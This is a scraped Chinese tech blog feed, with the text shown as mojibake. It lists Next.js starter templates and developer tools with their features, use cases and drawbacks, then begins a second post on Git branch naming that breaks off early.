<p>å¦‚æœæœ¬æ–‡èƒ½ç»™ä½ æä¾›å¯å‘å’Œå¸®åŠ©ï¼Œæ„Ÿè°¢å„ä½å°ä¼™ä¼´åŠ¨åŠ¨å°æ‰‹æŒ‡ï¼Œä¸€é”®ä¸‰è¿ (ç‚¹èµã€è¯„è®ºã€è½¬å‘)ï¼Œç»™æˆ‘ä¸€äº›æ”¯æŒå’Œé¼“åŠ±ï¼Œè°¢è°¢ã€‚</p>
<h2 data-id="heading-0">Rapidlaunch</h2>
<h3 data-id="heading-1">æ€»ç»“</h3>
<p>åŸºäº Next.js çš„å¿«é€Ÿå¯åŠ¨åº“ï¼Œæä¾› Starter Kits å’Œç»„ä»¶ï¼ŒåŠ é€Ÿ Web å¼€å‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23d3f2005f14400b896e59853b825a17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=z4pS2iH9%2FeyIefQ8UMKjOU%2BxugE%3D" alt="Rapidlaunch" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/rapidlaunch</code></p>
<h3 data-id="heading-2">ç‰¹æ€§</h3>
<ol>
<li>æä¾›å¤šç§ Starter Kitsï¼Œå¿«é€Ÿæ­å»ºåŸºç¡€æ¶æ„ã€‚</li>
<li>åŒ…å«å³ç”¨å‹ UI ç»„ä»¶ï¼Œå¿«é€Ÿæ‹¼è£…ç•Œé¢ã€‚</li>
<li>åŸºäº Next.jsï¼Œæ”¯æŒæœåŠ¡ç«¯æ¸²æŸ“ã€‚</li>
<li>ä»£ç å¼€æºï¼Œç»“æ„æ¸…æ™°ï¼Œæ˜“äºå®šåˆ¶ã€‚</li>
</ol>
<h3 data-id="heading-3">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿå¯åŠ¨æ–°é¡¹ç›®åŸå‹ã€‚</li>
<li>æ„å»ºåå°æˆ–è¥é”€é¡µé¢æ—¶å¯»æ‰¾ UI æ¨¡å—ã€‚</li>
<li>å›¢é˜Ÿç»Ÿä¸€é¡¹ç›®ç»“æ„å’Œè§„èŒƒã€‚</li>
</ol>
<h3 data-id="heading-4">ç¼ºç‚¹</h3>
<ol>
<li>ç»´æŠ¤ä¾èµ–ç¤¾åŒºè´¡çŒ®ã€‚</li>
<li>ç»‘å®š Next.jsï¼Œä¸é€‚ç”¨å…¶ä»–æ¡†æ¶ã€‚</li>
</ol>
<h2 data-id="heading-5">precedent</h2>
<h3 data-id="heading-6">æ€»ç»“</h3>
<p>Next.js é¡¹ç›®çš„ç²¾é€‰ç»„ä»¶å’Œå·¥å…·åº“ï¼ŒåŠ é€Ÿç°ä»£åŒ–åº”ç”¨å¼€å‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12df3dfc137b4d08af532f8c732eaedb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=R9i1Y0Rji%2BzhgvecvXa2QbzXiWA%3D" alt="precedent" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/precedent</code></p>
<h3 data-id="heading-7">ç‰¹æ€§</h3>
<ol>
<li>æä¾›æ¨¡æ€æ¡†ç­‰ç²¾é€‰ UI ç»„ä»¶ã€‚</li>
<li>åŒ…å«å®ç”¨è‡ªå®šä¹‰ React Hooksã€‚</li>
<li>å†…ç½® Next.js App Router å·¥å…·å‡½æ•°ã€‚</li>
<li>TypeScript ç¼–å†™ï¼Œç±»å‹å®‰å…¨ã€‚</li>
</ol>
<h3 data-id="heading-8">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿå¯åŠ¨é«˜è´¨é‡ Next.js é¡¹ç›®ã€‚</li>
<li>ç»Ÿä¸€å›¢é˜Ÿ UI å’Œä»£ç è§„èŒƒã€‚</li>
<li>æ„å»ºé«˜ä½“éªŒ Web åº”ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-9">ç¼ºç‚¹</h3>
<ol>
<li>ä¸ªäººç»´æŠ¤ï¼Œè®¾è®¡å¯èƒ½ä¸åˆä¼—å£ã€‚</li>
<li>åˆå­¦è€…éœ€æ—¶é—´ç†è§£å…¶ç»“æ„ã€‚</li>
</ol>
<h2 data-id="heading-10">Next-JS-Landing-Page-Starter-Template</h2>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>åŸºäº Next.js 14 çš„å¼€ç®±å³ç”¨ç€é™†é¡µæ¨¡æ¿ï¼Œé›†æˆå®Œæ•´å·¥å…·é“¾ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f25d5ba253b34b268a54b7eecbe91f8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=x19V8bRVR6F%2FojpTdq2v449HShg%3D" alt="Next-JS-Landing-Page-Starter-Template" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/next-js-landing-page-starter-template</code></p>
<h3 data-id="heading-12">ç‰¹æ€§</h3>
<ol>
<li>Next.js 14 + App Routerï¼Œé«˜æ€§èƒ½ã€‚</li>
<li>TypeScript + Tailwind CSS 3ï¼Œç±»å‹å®‰å…¨ä¸”æ ·å¼é«˜æ•ˆã€‚</li>
<li>å†…ç½® ESLintã€Prettier ç­‰ä»£ç è´¨é‡å·¥å…·ã€‚</li>
<li>é¢„é…ç½® VSCode å’Œ Netlify éƒ¨ç½²ã€‚</li>
</ol>
<h3 data-id="heading-13">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿå¯åŠ¨è¥é”€ç€é™†é¡µã€‚</li>
<li>åŸºäºé«˜æ ‡å‡†æ¨¡æ¿äºŒæ¬¡å¼€å‘ã€‚</li>
<li>æ„å»ºé«˜æ€§èƒ½å®˜ç½‘æˆ–ä½œå“é›†ã€‚</li>
</ol>
<h3 data-id="heading-14">ç¼ºç‚¹</h3>
<ol>
<li>è®¾è®¡åŸºç¡€ï¼Œéœ€å®šåˆ¶å“ç‰Œé£æ ¼ã€‚</li>
<li>é¢å‘å¼€å‘è€…ï¼Œå­¦ä¹ æˆæœ¬è¾ƒé«˜ã€‚</li>
</ol>
<h2 data-id="heading-15">Startup is free Next.js template</h2>
<h3 data-id="heading-16">æ€»ç»“</h3>
<p>ä¸“ä¸º SaaS åˆåˆ›å…¬å¸è®¾è®¡çš„å…è´¹ Next.js æ¨¡æ¿ï¼Œå«æ ¸å¿ƒé¡µé¢ä¸ç»„ä»¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14bb3b773c9943d9b2b84f93629e5122~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=bhN%2FLaDtn0R3i762VKj5J3ITyho%3D" alt="Startup is free Next.js template" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/startup-free-nextjs-saas-template</code></p>
<h3 data-id="heading-17">ç‰¹æ€§</h3>
<ol>
<li>åŸºäº Next.jsï¼Œæ€§èƒ½ä¸ SEO ä¼˜å¼‚ã€‚</li>
<li>åŒ…å«ä¸»é¡µã€å®šä»·ç­‰ SaaS å¿…å¤‡é¡µé¢ã€‚</li>
<li>æä¾›é¢„æ„å»º UI ç»„ä»¶å’Œå¸ƒå±€ã€‚</li>
<li>è®¾è®¡ç°ä»£å“åº”å¼ï¼Œé€‚é…å¤šç«¯ã€‚</li>
<li>å¼€æºå…è´¹ï¼Œæ˜“äºå®šåˆ¶ã€‚</li>
</ol>
<h3 data-id="heading-18">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>åˆåˆ›å…¬å¸å¿«é€Ÿæ„å»ºå®˜ç½‘ã€‚</li>
<li>å¼€å‘è€…åŸºäºé«˜è´¨é‡æ¨¡æ¿äºŒæ¬¡å¼€å‘ã€‚</li>
<li>å»ºç«‹å«åšå®¢çš„è¥é”€ç½‘ç«™ã€‚</li>
</ol>
<h3 data-id="heading-19">ç¼ºç‚¹</h3>
<ol>
<li>é€šç”¨è®¾è®¡ï¼Œéœ€å®šåˆ¶å“ç‰Œé£æ ¼ã€‚</li>
<li>ä»…å«å‰ç«¯ï¼Œéœ€è‡ªè¡Œé›†æˆåç«¯ã€‚</li>
</ol>
<h2 data-id="heading-20">next-saas-starter</h2>
<h3 data-id="heading-21">æ€»ç»“</h3>
<p>åŸºäº Next.js çš„å…è´¹å“åº”å¼ SaaS è½åœ°é¡µæ¨¡æ¿ï¼ŒJAMStack æ¶æ„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5016d2d464074e62839461df36bf6573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=4FD%2BU6dAwbbRSJOPIhpOSkFe0d0%3D" alt="next-saas-starter" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/next-saas-starter</code></p>
<h3 data-id="heading-22">ç‰¹æ€§</h3>
<ol>
<li>Next.js æ„å»ºï¼Œæ”¯æŒ SSRï¼ŒSEO å‹å¥½ã€‚</li>
<li>JAMStack æ¶æ„ï¼Œå®‰å…¨å¿«é€Ÿã€‚</li>
<li>å®Œå…¨å“åº”å¼è®¾è®¡ã€‚</li>
<li>é›†æˆ Tailwind CSSï¼Œæ˜“å®šåˆ¶ã€‚</li>
<li>åŒ…å« SaaS æ ¸å¿ƒç»„ä»¶ã€‚</li>
</ol>
<h3 data-id="heading-23">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿæ„å»º SaaS è¥é”€ç½‘ç«™ã€‚</li>
<li>è·å–é«˜æ€§èƒ½ Next.js é¡¹ç›®èµ·ç‚¹ã€‚</li>
<li>æ„å»ºé™æ€åŒ– Web åº”ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-24">ç¼ºç‚¹</h3>
<ol>
<li>åŠŸèƒ½åŸºç¡€ï¼Œéœ€æ‰©å±•ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>ä»…å«å‰ç«¯ï¼Œéœ€é›†æˆåç«¯ã€‚</li>
</ol>
<h2 data-id="heading-25">relivator-nextjs-template</h2>
<h3 data-id="heading-26">æ€»ç»“</h3>
<p>åŸºäº Next.js 15 å’Œ React 19 çš„å…¨æ ˆç”µå•† SaaS æ¨¡æ¿ï¼Œé›†æˆæ”¯ä»˜ä¸è®¤è¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b8c8b408343458a922573cee86f0318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=gFXEQdPiQ6fKi099jbLkxHBPCSo%3D" alt="relivator-nextjs-template" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/relivator-nextjs-template</code></p>
<h3 data-id="heading-27">ç‰¹æ€§</h3>
<ol>
<li>Next.js 15 + React 19ï¼Œä½“éªŒç°ä»£ã€‚</li>
<li>é›†æˆ Authã€æ”¯ä»˜ã€UI åº“å’Œ ORMã€‚</li>
<li>æä¾›å®Œæ•´ç”µå•†åŠŸèƒ½æ¨¡å—ã€‚</li>
<li>æ”¯æŒæ·±è‰²æ¨¡å¼ï¼ŒTailwind CSS å®šåˆ¶ã€‚</li>
<li>TypeScript ç¼–å†™ï¼Œç±»å‹å®‰å…¨ã€‚</li>
</ol>
<h3 data-id="heading-28">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿå¯åŠ¨å…¨æ ˆç”µå•†æˆ– SaaS é¡¹ç›®ã€‚</li>
<li>å¯»æ±‚é«˜é›†æˆåº¦ React/Next.js æ¨¡æ¿ã€‚</li>
<li>æ„å»ºå«æ”¯ä»˜çš„ç”¨æˆ·ç³»ç»Ÿã€‚</li>
</ol>
<h3 data-id="heading-29">ç¼ºç‚¹</h3>
<ol>
<li>æŠ€æœ¯æ ˆå¤æ‚ï¼Œä¸Šæ‰‹æ›²çº¿é™¡å³­ã€‚</li>
<li>åŠŸèƒ½ç¹å¤šï¼Œç®€å•é¡¹ç›®å¯èƒ½æ˜¾å¾—è‡ƒè‚¿ã€‚</li>
</ol>
<h2 data-id="heading-30">free-nextjs-admin-dashboard</h2>
<h3 data-id="heading-31">æ€»ç»“</h3>
<p>åŸºäº Next.js å’Œ Tailwind CSS çš„å…è´¹å¼€æºåå°ç®¡ç†æ¨¡æ¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0b98016ece427d99fe51dc6964f618~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=G9O7%2Bh%2F8kt2ERxbE4GUigESbfxY%3D" alt="free-nextjs-admin-dashboard" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/free-nextjs-admin-dashboard</code></p>
<h3 data-id="heading-32">ç‰¹æ€§</h3>
<ol>
<li>Next.js + Tailwind CSSï¼Œé«˜æ•ˆå¼€å‘ã€‚</li>
<li>æä¾›ä»ªè¡¨ç›˜ã€å›¾è¡¨ç­‰é¢„ç½®é¡µé¢ã€‚</li>
<li>å®Œå…¨å…è´¹å¼€æºï¼Œå¯å•†ç”¨ã€‚</li>
<li>å“åº”å¼è®¾è®¡ï¼Œé€‚é…å¤šç«¯ã€‚</li>
<li>ç»“æ„æ¸…æ™°ï¼Œæ˜“äºå®šåˆ¶ã€‚</li>
</ol>
<h3 data-id="heading-33">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿæ„å»ºåå°ç®¡ç†æˆ–ä»ªè¡¨ç›˜ã€‚</li>
<li>å­¦ä¹  Next.js å®æˆ˜å¼€å‘ã€‚</li>
<li>é¡¹ç›®åŸå‹å¿«é€Ÿå¼€å‘ã€‚</li>
</ol>
<h3 data-id="heading-34">ç¼ºç‚¹</h3>
<ol>
<li>ç¼ºä¹é«˜çº§åŠŸèƒ½æˆ–ä¼ä¸šæ”¯æŒã€‚</li>
<li>ç•Œé¢åŸºç¡€ï¼Œå¤æ‚é¡¹ç›®éœ€å®šåˆ¶ã€‚</li>
</ol>
<h2 data-id="heading-35">chadnext</h2>
<h3 data-id="heading-36">æ€»ç»“</h3>
<p>åŠŸèƒ½ä¸°å¯Œçš„ Next.js 15 å…¨æ ˆå¯åŠ¨æ¨¡æ¿ï¼Œé›†æˆ UIã€è®¤è¯ã€æ•°æ®åº“å’Œæ”¯ä»˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d61bb1f4788e45cda20ad0823f00fb0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=xB2vYQQ27w32bBjEtLf%2F4d2LEjE%3D" alt="chadnext" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/chadnext</code></p>
<h3 data-id="heading-37">ç‰¹æ€§</h3>
<ol>
<li>Next.js 15 App Routerï¼Œæ”¯æŒ SSRã€‚</li>
<li>é›†æˆ Shadcn/ui ç»„ä»¶åº“ã€‚</li>
<li>å†…ç½® LuciaAuth è®¤è¯ã€‚</li>
<li>ä½¿ç”¨ Prisma ORMã€‚</li>
<li>é¢„é…ç½® Stripe æ”¯ä»˜ã€‚</li>
</ol>
<h3 data-id="heading-38">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿå¯åŠ¨å…¨æ ˆ Web åº”ç”¨ã€‚</li>
<li>æ„å»ºå«æ”¯ä»˜çš„ SaaS äº§å“ã€‚</li>
<li>å¯»æ±‚å¼€ç®±å³ç”¨çš„åŸºç¡€æ¡†æ¶ã€‚</li>
</ol>
<h3 data-id="heading-39">ç¼ºç‚¹</h3>
<ol>
<li>æŠ€æœ¯æ ˆå›ºå®šï¼Œçµæ´»æ€§å—é™ã€‚</li>
<li>é›†æˆåŠŸèƒ½å¤šï¼Œç®€å•é¡¹ç›®ç•¥æ˜¾è‡ƒè‚¿ã€‚</li>
</ol>
<h2 data-id="heading-40">Next.js-Developer-Portfolio-Starter-Code</h2>
<h3 data-id="heading-41">æ€»ç»“</h3>
<p>åŸºäº Next.jsã€Tailwind CSS å’Œ Framer Motion çš„å¼€å‘è€…ä½œå“é›†æ¨¡æ¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83da96235c44148b5ed46a5cfd79cc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=gZYXr2yqv6jCLgpcs2UCixQyJEs%3D" alt="Next.js-Developer-Portfolio-Starter-Code" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/nextjs-developer-portfolio-starter-code</code></p>
<h3 data-id="heading-42">ç‰¹æ€§</h3>
<ol>
<li>Next.js æ¡†æ¶ï¼ŒSEO ä¸æ€§èƒ½ä¼˜å¼‚ã€‚</li>
<li>Tailwind CSS æ ·å¼ï¼Œå“åº”å¼è®¾è®¡ã€‚</li>
<li>é›†æˆ Framer Motion åŠ¨ç”»ã€‚</li>
<li>åŒ…å«ä½œå“é›†æ ¸å¿ƒé¡µé¢ã€‚</li>
</ol>
<h3 data-id="heading-43">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>å¿«é€Ÿæ­å»ºä¸ªäººå±•ç¤ºç½‘ç«™ã€‚</li>
<li>å­¦ä¹  Next.js åŠ¨ç”»å®æˆ˜ã€‚</li>
</ol>
<h3 data-id="heading-44">ç¼ºç‚¹</h3>
<ol>
<li>åŠŸèƒ½è®¾è®¡åŸºç¡€ï¼Œéœ€æ·±åº¦å®šåˆ¶ã€‚</li>
<li>ä¾èµ–ç‰¹å®šæŠ€æœ¯æ ˆï¼Œéœ€å­¦ä¹ æˆæœ¬ã€‚</li>
</ol>
<h2 data-id="heading-45">Galaxy</h2>
<h3 data-id="heading-46">æ€»ç»“</h3>
<p>ä¸“ä¸ºå·¥ç¨‹å¸ˆè®¾è®¡çš„ç°ä»£åŒ– SQL ç¼–è¾‘å™¨ï¼Œé›†æˆ AI è¾…åŠ©ä¸å›¢é˜Ÿåä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c378e97868446058a26af190c8b01d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=aITu4MIypdtMzUWAtKjAJu8UTdY%3D" alt="Galaxy" loading="lazy"/></p>
<p>é“¾æ¥: <code>https://www.indietools.work/product/galaxy</code></p>
<h3 data-id="heading-47">ç‰¹æ€§</h3>
<ol>
<li>é«˜æ€§èƒ½ï¼Œè½»é‡çº§å†…å­˜å ç”¨ã€‚</li>
<li>å†…ç½® AI åŠ©æ‰‹è¾…åŠ© SQL ç¼–å†™ã€‚</li>
<li>æ”¯æŒå®æ—¶åä½œä¸æƒé™ç®¡ç†ã€‚</li>
<li>ä¼ä¸šçº§å®‰å…¨æ ‡å‡†ã€‚</li>
<li>ä¼˜åŒ– SQL å·¥ä½œæµä½“éªŒã€‚</li>
</ol>
<h3 data-id="heading-48">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>é«˜æ•ˆç¼–å†™å’Œè°ƒè¯• SQLã€‚</li>
<li>å›¢é˜Ÿåä½œåˆ†ææ•°æ®ã€‚</li>
<li>ä¼ä¸šçº§å®‰å…¨ SQL å¼€å‘ã€‚</li>
</ol>
<h3 data-id="heading-49">ç¼ºç‚¹</h3>
<ol>
<li>èšç„¦ SQLï¼Œæ•°æ®å¯è§†åŒ–åŠŸèƒ½æœ‰é™ã€‚</li>
<li>ç”Ÿæ€ç³»ç»Ÿå°šä¸å¦‚è€ç‰Œå·¥å…·å®Œå–„ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¸¸è§çš„ Git åˆ†æ”¯å‘½åç­–ç•¥å’Œå®è·µ]]></title>    <link>https://juejin.cn/post/7590011643296890918</link>    <guid>https://juejin.cn/post/7590011643296890918</guid>    <pubDate>2026-01-02T08:43:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296890918" data-draft-id="7590011643296874534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¸¸è§çš„ Git åˆ†æ”¯å‘½åç­–ç•¥å’Œå®è·µ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T08:43:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·2685161210756"/> <meta itemprop="url" content="https://juejin.cn/user/534829144487531"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¸¸è§çš„ Git åˆ†æ”¯å‘½åç­–ç•¥å’Œå®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/534829144487531/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·2685161210756
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:43:30.000Z" title="Fri Jan 02 2026 08:43:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é’ˆå¯¹ç ”å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒï¼Œä»¥ä¸‹æ˜¯å¸¸è§çš„ Git åˆ†æ”¯å‘½åç­–ç•¥å’Œå®è·µï¼š</p>
<h2 data-id="heading-0">ä¸€ã€åŸºäº Git Flow çš„æ ‡å‡†æ¨¡å‹ï¼ˆç»å…¸ï¼‰</h2>
<pre><code class="hljs language-lua" lang="lua">master         <span class="hljs-comment">-- ç”Ÿäº§ç¯å¢ƒï¼ˆç¨³å®šç‰ˆæœ¬ï¼‰</span>
â”œâ”€â”€ hotfix/*   <span class="hljs-comment">-- ç”Ÿäº§ç´§æ€¥ä¿®å¤åˆ†æ”¯</span>
release/*      <span class="hljs-comment">-- æµ‹è¯•ç¯å¢ƒåˆ†æ”¯ï¼ˆé¢„å‘å¸ƒï¼‰</span>
